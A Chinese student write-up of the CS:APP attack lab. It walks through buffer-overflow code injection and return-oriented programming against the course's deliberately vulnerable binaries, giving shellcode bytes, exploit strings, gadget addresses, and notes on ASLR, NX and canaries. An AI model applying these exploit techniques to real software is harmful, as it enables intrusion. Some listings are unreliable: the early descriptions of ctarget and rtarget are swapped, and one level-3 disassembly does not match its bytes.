## attacklab
#### 实验准备
- bug：ubuntu22中运行ctarget会造成segmentation fault(glibc版本2.35)，20中就没此错误（glibc2.31)。
- hex2raw: 将十六进制转换成字符串的工具。
- ctarget：易受面向返回的编程攻击的可执行程序(return-oriented-programming,ROP)。
- rtarget：易受代码注入攻击的可执行程序。
- 寄存器：
	- %rax 通常用于存储函数调用的返回结果，同时也用于乘法和除法指令中。在imul 指令中，两个64位的乘法最多会产生128位的结果，需要 %rax 与 %rdx 共同存储乘法结果，在div 指令中被除数是128 位的，同样需要%rax 与 %rdx 共同存储被除数。
	- %rsp 是堆栈指针寄存器，通常会指向**栈顶**位置，堆栈的 pop 和push 操作就是通过改变 %rsp 的值即移动堆栈指针的位置来实现的。
	- %rbp 是栈帧指针，栈基地址寄存器，保存当前帧的栈底地址。
	- %rdi, %rsi, %rdx, %rcx,%r8, %r9 六个寄存器用于存储函数调用时的6个参数（如果有6个或6个以上参数的话）。x86中用%rdi来传递第一个参数。
- 显示objdump -d的函数行：
```bash
objdump -d ctarget | grep -E '^\s*[0-9a-f]+ <' #-E 提供正则表达式支持。\s*表示可以以可选的空格为起始开头
```
- getbuf()函数如下：
```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```
- 注：堆栈主要用于存储数据和维护程序的执行上下文，包括局部变量、函数参数、返回地址和其他与函数调用相关的信息，指令一般不会存储在堆栈上。但是在某些特定场景下指令可以从栈上执行：
	- 函数返回ret：当函数完成执行时，它通常从堆栈中检索返回地址，以确定在调用代码中返回的位置。CPU将从堆栈中读取返回地址，并更新指令指针（例如程序计数器）以在指定地址继续执行。（如下的level2就将返回地址改为栈上，在栈上执行了一条指令以后再跳转到了目标地址）
	- 跳转指令(call jmp)：某些跳转或分支指令，如调用或jmp指令，可以修改指令指针以将控制权转移到程序的另一部分。在某些情况下，跳转的目的地址可以从堆栈中导出。（JOP攻击）
	- 实时编译（JIT）：在JIT场景中，代码可以在运行时动态生成，并存储在可执行内存区域中，包括堆栈。这包括将机器代码指令写入内存，并指示CPU执行这些指令。这种技术通常用于动态语言或虚拟机中，通过动态生成优化的代码来提高性能。

#### 实验一，代码注入攻击：
##### level1
- ctarget中的test函数如下：
```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit.6 Getbuf returned 0x%x\n", val);
}
```
- touch1函数如下：
```c
void touch1()
{
	vlevel = 1;/* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```
- 需要攻击栈在调用getbuf后不返回到test函数，而是跳转到touch函数中并退出。
- 查看getbuf反汇编：可以发现为Gets分配了0x28(40)个字节的内存，只需要使gets的字符溢出，用touch函数的起始地址覆盖栈中getbuf函数的return address即可。
```bash
00000000004017a8 <getbuf>:  
 4017a8:       48 83 ec 28             sub    $0x28,%rsp  
 4017ac:       48 89 e7                mov    %rsp,%rdi  # 此处可以看到%rdi的地址为第一个参数的地址
 4017af:       e8 8c 02 00 00          callq  401a40 <Gets>  
 4017b4:       b8 01 00 00 00          mov    $0x1,%eax  
 4017b9:       48 83 c4 28             add    $0x28,%rsp  
 4017bd:       c3                      retq  
 4017be:       90                      nop  
 4017bf:       90                      nop
```

##### level2
- touch2函数如下：需要在调用getbuf后跳转到touch2函数中，同时给touch2函数传递正确的cookie参数。
	- x86中用%rdi来传递第一个参数。
	- 不要试图在利用漏洞的代码中使用jmp或call指令。目的地编码这些指令的地址很难制定。对的所有传输使用ret指令控制。
```c
void touch2(unsigned val)
{
	vlevel = 2;/* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```
- 使用GCC作为汇编程序，使用OBJDUMP来反汇编程序，可以方便地生成字节码。示例程序example.s：
```bash
pushq $0xabcdef # Push value onto stack
addq $17,%rax # Add 17 to %rax
movl %eax,%edx # Copy lower 32 bits to %edx
```
- 汇编再反汇编
```bash
gcc -c example.s
objdump -d example.o > example.d
```
- 结果：
```bash
example.o:     file format elf64-x86-64  

Disassembly of section .text:  
  
0000000000000000 <.text>:  
  0:   68 ef cd ab 00          pushq  $0xabcdef  
  5:   48 83 c0 11             add    $0x11,%rax  
  9:   89 c2                   mov    %eax,%edx
```
- 提取出其中的字节序列可以传递给hex2raw
```bash
68 ef cd ab 00 48 83 c0 11 89 c2
```
解答：
- 通过gdb看到`p/x $rsp`查看getbuf函数中栈顶地址为0x5561dc78，该起始位置向上的40个字节为分配给buf数组的空间，可以在该位置放入要注入攻击的代码，然后如level1一样在ret处返回到该位置，即可攻击成功。也就是说利用buf数组，可以存放40个字节的攻击代码。
- 攻击代码如下：只需要将该段代码放入buf中，让ret返回到rsp所指的buf地址即可。(手写汇编再objdump -d获取字节码)
```bash
0000000000000000 <.text>:  
  0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi  # 直接将cookie放入%rdi中
  7:   68 ec 17 40 00          pushq  $0x4017ec  
  c:   c3                      retq
```
- p1-level2.txt可以如下：
```bash
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00  
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00  
78 dc 61 55 # 用栈溢出使ret返回我们想要取得地址
```
- 结果：`cat p1-level2.txt | ./hex2raw | ./ctarget -q`：
```bash
Cookie: 0x59b997fa  
Type string:Touch2!: You called touch2(0x59b997fa)  
Valid solution for level 2 with target ctarget  
PASS: Would have posted the following:  
       user id bovik  
       course  15213-f15  
       lab     attacklab  
       result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 78 DC 61 55
```

##### level3
- ctarget中有`hexmatch`和`touch3`这两个函数：任务是让ctarget执行touch3而不是返回test函数。此处应该注入的应为string。
- 注意：
	- 需要在利用缓冲区溢出的字符串中包含`cookie`的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x。
	- 注意在c语言中的字符串表示会在末尾处加一个`\0`。
	- 您注入的代码应将寄存器`％rdi`设置为此字符串的地址。
	- 调用函数`hexmatch`和`strncmp`时，它们会将数据压入堆栈，从而覆盖存放`getbuf`使用的缓冲区的内存部分。 因此，需要注意存放`Cookie`字符串的位置。
```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	/* "%.8x"表示应转换为最小宽度为8个字符的小写十六进制表示。如果生成的字符串短于8个字符，则会用前导零填充。 */
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;//这里为9的原因是我们要比较最后一个是否为'\0'
}

void touch3(char *sval)
{
	vlevel = 3;/* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```
- touch3反汇编：
```c
00000000004018fa <touch3>:  
 4018fa:       53                      push   %rbx    
 4018fb:       48 89 fb                mov    %rdi,%rbx  
 4018fe:       c7 05 d4 2b 20 00 03    movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>  
 401905:       00 00 00    
 401908:       48 89 fe                mov    %rdi,%rsi  
 40190b:       8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>  
 401911:       e8 36 ff ff ff          call   40184c <hexmatch>  
 401916:       85 c0                   test   %eax,%eax
 ...
```
解答：因为random的加入，所以字符串s的位置是不确定的。反汇编中`add  $0xffffffffffffff80,%rsp`为hexmatch分配了128字节的栈。所以buf中的内容会被覆盖，需要找到更加安全的栈空间存放所要执行的代码。在getbuf初始阶段rsp为0x5561dca0，0x5561dca0这个字节存放的便是getbuf的return address（即call getbuf的下一条指令）：
```bash
(gdb) b *0x4017a8
(gdb) r
(gdb) info r rsp  
rsp            0x5561dca0          0x5561dca0  
(gdb) x 0x5561dca0  
0x5561dca0:     0x00401976
```
由于此次攻击目标为执行touch3，即在getbuf返回后就调用touch3而不是test，可以认为test的栈是安全不会被改变的，那么就可以将`cookie`放在test的栈中，即比getbuf初始化rsp地址高的地方。栈图如下：
```bash
                Stack
                +--------------+<------- high address
                |              |
                |     ...      |
            +-->+--------------+<---- 0x5561dcb0
            |   |   (cookie)   |# 原来存储test的其它信息(什么信息？栈帧？esp？)
test stack--+   +--------------+<---- set cookie here(0x5561dca8)
            |   |  return add  |
            +-->+--------------+<----return address(0x5561dca0)
            |   |              |
getbufstack-+   | (40字节的buf) |
            |   |              |
            +-->+--------------+<---- low address(buf栈顶0x5561dc78)
```
- 注入汇编代码如下：因为touch3中传入的参数是指针类型的，所以需要传递时候需要传递参数地址。
```bash
0000000000000000 <.text>:  
  0:   48 c7 c7 fa 97 b9 59    mov    $0x5561dca8,%rdi  # 将cookie地址放入%rdi中
  7:   68 ec 17 40 00          pushq  $0x4018fa  # 将touch3地址设置为return address
  c:   c3                      retq
```
- cookie为`0x59b997fa`，十六进制和十进制与ascii码转换如下：
```bash
         2 3 4 5 6 7       30 40 50 60 70 80 90 100 110 120  
       -------------      ---------------------------------  
      0:   0 @ P ` p     0:    (  2  <  F  P  Z  d   n   x  
      1: ! 1 A Q a q     1:    )  3  =  G  Q  [  e   o   y  
      2: " 2 B R b r     2:    *  4  >  H  R  \  f   p   z  
      3: # 3 C S c s     3: !  +  5  ?  I  S  ]  g   q   {  
      4: $ 4 D T d t     4: "  ,  6  @  J  T  ^  h   r   |  
      5: % 5 E U e u     5: #  -  7  A  K  U  _  i   s   }  
      6: & 6 F V f v     6: $  .  8  B  L  V  `  j   t   ~  
      7: ' 7 G W g w     7: %  /  9  C  M  W  a  k   u  DEL  
      8: ( 8 H X h x     8: &  0  :  D  N  X  b  l   v  
      9: ) 9 I Y i y     9: '  1  ;  E  O  Y  c  m   w  
      A: * : J Z j z  
      B: + ; K [ k {  
      C: , < L \ l |  
      D: - = M ] m }  
      E: . > N ^ n ~  
      F: / ? O _ o DEL
```
- 字节码如下：
```c
48 c7 c7 a8 dc 61 55    /* mov */ 
68 fa 18 40 00          /* push */ 
c3                      /* ret */ 
61 61 61                /* garbage */ 
61 61 61 61 61 61 61 61 /* garbage */ 
61 61 61 61 61 61 61 61 /* garbage */ 
61 61 61 61 61 61 61 61 /* garbage */ 
78 dc 61 55 00 00 00 00 /* set return address */
/* 0x59b997fa的ascii码 */
35 39 62 39 39 37 66 61 /* save cookie in the test func stack */
```

#### 实验二：ROP
对程序RTARGET进行代码注入攻击比对CTARGET进行难度要大得多，因为它使用两种技术来阻止此类攻击：
1. 随机栈偏移。这让我们很难找到程序的地址
2. 标记为不可执行区域。这使得我们的攻击代码无法被执行。
以上三个实验都是基于code injection的，它基于两点：1.可以执行栈上的代码2.栈的位置固定。上面三个实验都有这样的操作，修改函数返回地址，使其指向栈上精心准备的代码，而返回地址是通过绝对地址给出的。但是，如果栈的位置是随机的，除非通过大量的尝试，否则将不可能确定注入代码的地址，这是code injection的一个挑战。另一个更为严峻的挑战是，操作系统和编译器干脆禁止执行栈上的代码，如果执行，直接报异常。然而，道高一尺魔高一丈，这个世界上竟然存在Return-Oriented Programming这种令人惊叹的hack方法，ROP不注入代码，而是就是利用程序中已经存在的代码片段（gadget），将它们进行拼凑，进而变相地运行”自己“的程序。由于栈随机化只能将栈的位置随机化，而不能将text中的指令位置随机化，并且我们运行的是text中的代码，而不是栈上的代码，所以很好的回避了安全系统。
#### 防御代码注入
##### 栈随机化
- 在level2和level3的攻击中，我们不仅插入了攻击代码，在插入了指向这段攻击代码的指针。而这个前提就是——我们知道攻击代码放在哪里，因为buf的地址在每次程序运行时是确定的。  
- 栈随机化就是栈的位置在每次程序运行时都有变化。实现方式是：在程序开始时，在栈上分配一段0-n的随机大小字节空间，程序不使用这段空间，n必须足够大来保证地址的随机变化性，但是又要足够小，保证不浪费过多的空间。
- 用以下代码测试ASLR(Address-Space Layout Randomization)地址空间布局随机化：
```c
#include <stdio.h>

void main(){
    long local;
    printf("%p\n",&local);
}
```
运行：可以看到地址变化的范围还是挺大的。
```bash
[zqz][5]:~$ ./a.out    
0x7ffdd0d9a320  
[zqz][6]:~$ ./a.out    
0x7fff263dc9f0  
[zqz][7]:~$ ./a.out    
0x7ffdca5b71e0
```
- 关闭ASLR：地址不再随机变化，说明栈空间的起始地址是固定的。
```bash
[zqz][8]:~$ setarch `uname -m` -R ./a.out  
0x7fffffffdd80  
[zqz][9]:~$ setarch `uname -m` -R ./a.out  
0x7fffffffdd80  
[zqz][10]:~$ setarch `uname -m` -R ./a.out  
0x7fffffffdd80
```
- 但是有一种简单的方法可以攻破栈随机化：nop sled(nop slide)，即在攻击代码之前插入一段nop，只要攻击者能够猜中序列中的某个地址，程序就会“滑”到攻击代码处完成攻击。
##### 限制可执行代码区域
- 在level2和level3中，我们都在栈上插入了代码去执行。所以，一种可行的防止缓冲区溢出的方法是限制哪些内存区域能够存放可执行代码。  
- 许多系统对操作系统虚拟内存的页提供3种访问控制形式：读（从内存读数据）、写（向内存写数据）、可执行（将内存的内容看做机器的代码段）。在之前的x86体系中，读和可执行被合并成了1个，意味着页可读必定就是可执行。对于栈来说，必定是可读可写，同时也意味着可执行。  
- AMD为它的64位处理器的内存提供了不执行位，由硬件检测，效率没有损失。
##### 栈破坏检测
- 最新版本的gcc在产生的代码中加入了栈保护者机制(stack protector)，来检测缓冲区越界。思想是在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀(canary)值。即在buf和return address中有一个随机的金丝雀值，可以将该原值放在一个只读区域内，当要执行ret指令时先检查该值是否被改来判断是否遭受攻击。
##### level4
ROP的攻击方法是借用代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。这段指令一般称之为gadget，即gadget + retq。我们可以利用多个reqt跳到不同的gadget来实现我们完整的攻击流。
ROP攻击方法的关键就是ret指令。可以先通过静态分析的方式找到所有包含ret附近的指令，这些指令就可以变为我们的gadget。
- **问题**：ret指令做的到底是什么？`pop %rbx`十六进制是`41 5d`还是`5d`？为什么栈上地址要填充为8个字节？变长指令集是如何区分指令边界的？
	- 答：ret弹出栈上内容（指令地址）放入eip寄存器中，下一条便执行该地址的指令。`pop %rbx`是`5d`，`pop %r13`是`41 5d`。x86为了向前保持兼容性，有许多指令转义编码（类似转义符`\`）r8以后的便都是64位寄存器，为了区分出64位寄存器需要加上指令前缀`41`。因为是64位操作系统。一次读取一个字节进行解析，直到读取的字节数能完整解析出一条指令为之。再进行下一条指令的解析。

- 在这一步中，我们重复level2的攻击，但是需要在rtarget中利用rop完成攻击，并且只能使用两个gadget。
- level2主要目的就是将cookie放入%rdi寄存器中，然后ret到touch2地址。
解答：将cookie放入%rdi寄存器中有两种思路：1. `mov %1, %rdi`，由于无法指定%1为cookie的值，此种方法不合适。2. `pop %rdi`，当执行该指令的时候会将栈上的内容弹出放入到%rdi中，所以可以通过栈溢出将当前栈上的内容以cookie覆盖即可。所以我们只需要找`pop %rdi; ret`也就是`5f c3`的指令即可。但是通过查找farm中的gadget发现并没有`5f c3`指令，只能通过间接方式来对%rdi进行赋值。思路是`pop %reg; movq %reg %rdi`。以%reg为%rax为例，我们只需要找到`58; 49 89 c7`即可。
```bash
00000000004019a7 <addval_219>:  
 4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax  # 58 90为popq %rax; nop
 4019ad:       c3

00000000004019c3 <setval_426>:  
 4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)  # 48 89 c7 90为movq %rax %rdi; nop
 4019c9:       c3
```
于是exploit string可以是：
```bash
AB AB AB AB AB AB AB AB  
AB AB AB AB AB AB AB AB  
AB AB AB AB AB AB AB AB  
AB AB AB AB AB AB AB AB  
AB AB AB AB AB AB AB AB  
AB 19 40 00 00 00 00 00  # popq %raxl; nop的地址
FA 97 B9 59 00 00 00 00  # cookie
C5 19 40 00 00 00 00 00  # movq %rax %rdi; nop; ret
EC 17 40 00 00 00 00 00  # touch2的地址
```
如果不按题目的限制，可以只用用`5f popd %rdi`指令：`401419:       69 c0 5f c3 00 00       imul   $0xc35f,%eax,%eax`。
exploit string可以是：
```bash
ab ab ab ab ab ab ab ab  
ab ab ab ab ab ab ab ab  
ab ab ab ab ab ab ab ab  
ab ab ab ab ab ab ab ab  
ab ab ab ab ab ab ab ab  
1B 14 40 00 00 00 00 00  
fa 97 b9 59 00 00 00 00  
ec 17 40 00 00 00 00 00
```
##### level5
自己想
